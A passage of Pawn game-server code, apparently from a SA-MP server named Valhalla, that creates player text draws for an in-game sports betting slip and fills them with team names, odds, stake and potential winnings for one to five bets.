		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 6 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 6 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 6 ], 1);

		KladionicaSM[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid, 480.625000, 187.000030, "1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.5");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 7 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 7 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 7 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 7 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 7 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 7 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 7 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 7 ], 1);

		KladionicaSM[ playerid ][ 8 ] = CreatePlayerTextDraw(playerid, 236.625000, 171.916595, "Domacin");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 8 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 8 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 8 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 8 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 8 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 8 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 8 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 8 ], 1);

		KladionicaSM[ playerid ][ 9 ] = CreatePlayerTextDraw(playerid, 362.000000, 171.166625, "GOst");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 9 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 9 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 9 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 9 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 9 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 9 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 9 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 9 ], 1);

		KladionicaSM[ playerid ][ 10 ] = CreatePlayerTextDraw(playerid, 453.000000, 171.583297, "Tip___Kvota");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 10 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 10 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 10 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 10 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 10 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 10 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 10 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 10 ], 1);

		KladionicaSM[ playerid ][ 11 ] = CreatePlayerTextDraw(playerid, 206.000000, 147.416580, "Valhalla Kladionica");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 11 ], 0.751250, 1.529998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 11 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 11 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 11 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 11 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 11 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 11 ], 0);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 11 ], 1);

		KladionicaSM[ playerid ][ 12 ] = CreatePlayerTextDraw(playerid, 472.625000, 297.749969, "Valhalla");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 12 ], 0.751250, 1.529998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 12 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 12 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 12 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 12 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 12 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 12 ], 0);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 12 ], 1);

		KladionicaSM[ playerid ][ 13 ] = CreatePlayerTextDraw(playerid, 154.125000, 309.916778, "www.valhalla-ogc.com");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 13 ], 0.228749, 0.719165);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 13 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 13 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 13 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 13 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 13 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 13 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 13 ], 1);

		KladionicaSM[ playerid ][ 14 ] = CreatePlayerTextDraw(playerid, 208.125000, 168.583343, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 14 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 14 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 14 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 14 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 14 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 14 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 14 ], 4);

		KladionicaSM[ playerid ][ 15 ] = CreatePlayerTextDraw(playerid, 322.875000, 167.833328, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 15 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 15 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 15 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 15 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 15 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 15 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 15 ], 4);

		KladionicaSM[ playerid ][ 16 ] = CreatePlayerTextDraw(playerid, 439.500000, 167.083343, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 16 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 16 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 16 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 16 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 16 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 16 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 16 ], 4);

		KladionicaSM[ playerid ][ 17 ] = CreatePlayerTextDraw(playerid, 475.500000, 167.500015, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 17 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 17 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 17 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 17 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 17 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 17 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 17 ], 4);

		KladionicaSM[ playerid ][ 18 ] = CreatePlayerTextDraw(playerid, 111.000000, 272.333190, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 18 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 18 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 18 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 18 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 18 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 18 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 18 ], 4);

		KladionicaSM[ playerid ][ 19 ] = CreatePlayerTextDraw(playerid, 518.750000, 168.500015, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 19 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 19 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 19 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 19 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 19 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 19 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 19 ], 4);

		KladionicaSM[ playerid ][ 20 ] = CreatePlayerTextDraw(playerid, 113.750000, 167.749984, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 20 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 20 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 20 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 20 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 20 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 20 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 20 ], 4);
		
		KladionicaSM[ playerid ][ 21 ] = CreatePlayerTextDraw(playerid, 130.125000, 295.916778, "Potencijalni dobitak");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 21 ], 0.228749, 0.719165);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 21 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 21 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 21 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 21 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 21 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 21 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 21 ], 1);
		
		KladionicaSM[ playerid ][ 22 ] = CreatePlayerTextDraw(playerid, 130.125000, 285.916778, "Uplata");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 22 ], 0.228749, 0.719165);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 22 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 22 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 22 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 22 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 22 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 22 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 22 ], 1);
		
		KladionicaSM[ playerid ][ 23 ] = CreatePlayerTextDraw(playerid, 320.750000, 305.916625, "Status");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 23 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 23 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 23 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 23 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 23 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 23 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 23 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 23 ], 1);
		PlayerTextDrawSetSelectable(playerid, KladionicaSM[ playerid ][ 23 ], true);

        KladListicSM[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 109.500000, 196.249954, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladListicSM[ playerid ][ 0 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladListicSM[ playerid ][ 0 ], 413.125000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladListicSM[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, KladListicSM[ playerid ][ 0 ], -1);
		PlayerTextDrawSetShadow(playerid, KladListicSM[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, KladListicSM[ playerid ][ 0 ], 0);
		PlayerTextDrawFont(playerid, KladListicSM[ playerid ][ 0 ], 4);

		KladListicSM[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 109.250000, 204.249938, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladListicSM[ playerid ][ 1 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladListicSM[ playerid ][ 1 ], 413.750000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladListicSM[ playerid ][ 1 ], 1);
		PlayerTextDrawColor(playerid, KladListicSM[ playerid ][ 1 ], -1);
		PlayerTextDrawSetShadow(playerid, KladListicSM[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, KladListicSM[ playerid ][ 1 ], 0);
		PlayerTextDrawFont(playerid, KladListicSM[ playerid ][ 1 ], 4);

		KladListicSM[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, 109.625000, 212.833236, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladListicSM[ playerid ][ 2 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladListicSM[ playerid ][ 2 ], 413.125000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladListicSM[ playerid ][ 2 ], 1);
		PlayerTextDrawColor(playerid, KladListicSM[ playerid ][ 2 ], -1);
		PlayerTextDrawSetShadow(playerid, KladListicSM[ playerid ][ 2 ], 0);
		PlayerTextDrawSetOutline(playerid, KladListicSM[ playerid ][ 2 ], 0);
		PlayerTextDrawFont(playerid, KladListicSM[ playerid ][ 2 ], 4);

		KladListicSM[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid, 110.625000, 221.999908, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladListicSM[ playerid ][ 3 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladListicSM[ playerid ][ 3 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladListicSM[ playerid ][ 3 ], 1);
		PlayerTextDrawColor(playerid, KladListicSM[ playerid ][ 3 ], -1);
		PlayerTextDrawSetShadow(playerid, KladListicSM[ playerid ][ 3 ], 0);
		PlayerTextDrawSetOutline(playerid, KladListicSM[ playerid ][ 3 ], 0);
		PlayerTextDrawFont(playerid, KladListicSM[ playerid ][ 3 ], 4);

		KladListicSM[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 109.750000, 229.999908, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladListicSM[ playerid ][ 4 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladListicSM[ playerid ][ 4 ], 413.750000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladListicSM[ playerid ][ 4 ], 1);
		PlayerTextDrawColor(playerid, KladListicSM[ playerid ][ 4 ], -1);
		PlayerTextDrawSetShadow(playerid, KladListicSM[ playerid ][ 4 ], 0);
		PlayerTextDrawSetOutline(playerid, KladListicSM[ playerid ][ 4 ], 0);
		PlayerTextDrawFont(playerid, KladListicSM[ playerid ][ 4 ], 4);

		KladListicSM[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid, 109.500000, 238.583175, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladListicSM[ playerid ][ 5 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladListicSM[ playerid ][ 5 ], 413.125000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladListicSM[ playerid ][ 5 ], 1);
		PlayerTextDrawColor(playerid, KladListicSM[ playerid ][ 5 ], -1);
		PlayerTextDrawSetShadow(playerid, KladListicSM[ playerid ][ 5 ], 0);
		PlayerTextDrawSetOutline(playerid, KladListicSM[ playerid ][ 5 ], 0);
		PlayerTextDrawFont(playerid, KladListicSM[ playerid ][ 5 ], 4);

		KladListicSM[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid, 110.500000, 245.999816, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladListicSM[ playerid ][ 6 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladListicSM[ playerid ][ 6 ], 413.125000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladListicSM[ playerid ][ 6 ], 1);
		PlayerTextDrawColor(playerid, KladListicSM[ playerid ][ 6 ], -1);
		PlayerTextDrawSetShadow(playerid, KladListicSM[ playerid ][ 6 ], 0);
		PlayerTextDrawSetOutline(playerid, KladListicSM[ playerid ][ 6 ], 0);
		PlayerTextDrawFont(playerid, KladListicSM[ playerid ][ 6 ], 4);
		
		KladListicSM[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid, 109.000000, 254.583099, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladListicSM[ playerid ][ 7 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladListicSM[ playerid ][ 7 ], 414.375000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladListicSM[ playerid ][ 7 ], 1);
		PlayerTextDrawColor(playerid, KladListicSM[ playerid ][ 7 ], -1);
		PlayerTextDrawSetShadow(playerid, KladListicSM[ playerid ][ 7 ], 0);
		PlayerTextDrawSetOutline(playerid, KladListicSM[ playerid ][ 7 ], 0);
		PlayerTextDrawFont(playerid, KladListicSM[ playerid ][ 7 ], 4);

		KladListicSM[ playerid ][ 8 ] = CreatePlayerTextDraw(playerid, 110.625000, 263.166473, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladListicSM[ playerid ][ 8 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladListicSM[ playerid ][ 8 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladListicSM[ playerid ][ 8 ], 1);
		PlayerTextDrawColor(playerid, KladListicSM[ playerid ][ 8 ], -1);
		PlayerTextDrawSetShadow(playerid, KladListicSM[ playerid ][ 8 ], 0);
		PlayerTextDrawSetOutline(playerid, KladListicSM[ playerid ][ 8 ], 0);
		PlayerTextDrawFont(playerid, KladListicSM[ playerid ][ 8 ], 4);

		new broj = 0;
        for( new i = 0; i < 10; i++ ) {

	    	if( KladionicaListic[ playerid ][ parID ][ i ] != -1 ) {
	    	    broj++;
	    	}
		}

		new str[ 256 ];
		
		format( str, sizeof( str ), "Potencijalni dobitak: ~w~%.2f$", KladionicaListic[ playerid ][ Dobitak ] );

		PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 21 ], str );
		
		format( str, sizeof( str ), "Uplata: ~w~%d$", KladionicaListic[ playerid ][ Uplata ] );

		PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 22 ], str );

		if( broj == 1 ) {
		    
			format( str, sizeof( str ), "%s",
				bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s",
				bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
			format( str, sizeof( str ), "%s",
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		}
		else if( broj == 2 ) {

			format( str, sizeof( str ), "%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 1 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 1 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s",
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f~n~%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 1 ] ), KladionicaListic[ playerid ][ Kvota ][ 1 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		 	
		}
		else if( broj == 3 ) {

			format( str, sizeof( str ), "%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 1 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 2 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 1 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 2 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s",
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f~n~%s______%.2f~n~%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 1 ] ), KladionicaListic[ playerid ][ Kvota ][ 1 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 2 ] ), KladionicaListic[ playerid ][ Kvota ][ 2 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		}
		else if( broj == 4 ) {

			format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 2 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 3 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 2 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 3 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s",
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 1 ] ), KladionicaListic[ playerid ][ Kvota ][ 1 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 2 ] ), KladionicaListic[ playerid ][ Kvota ][ 2 ],
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 3 ] ), KladionicaListic[ playerid ][ Kvota ][ 3 ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );
		}
		else if( broj == 5 ) {

			format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 3 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID1 ][ 4 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s",
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 0 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 1 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 2 ] ][ teamName ],
			    bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 3 ] ][ teamName ],
				bettingInfo[ KladionicaListic[ playerid ][ teamID2 ][ 4 ] ][ teamName ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );
		 	
		 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s",
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ],
				KladionicaListic[ playerid ][ HourPobeda ] );

		 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );
		 	
		 	format( str, sizeof( str ), "%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f~n~%s______%.2f",
				UzmiTipUtakmice( KladionicaListic[ playerid ][ keciksdva ][ 0 ] ), KladionicaListic[ playerid ][ Kvota ][ 0 ],
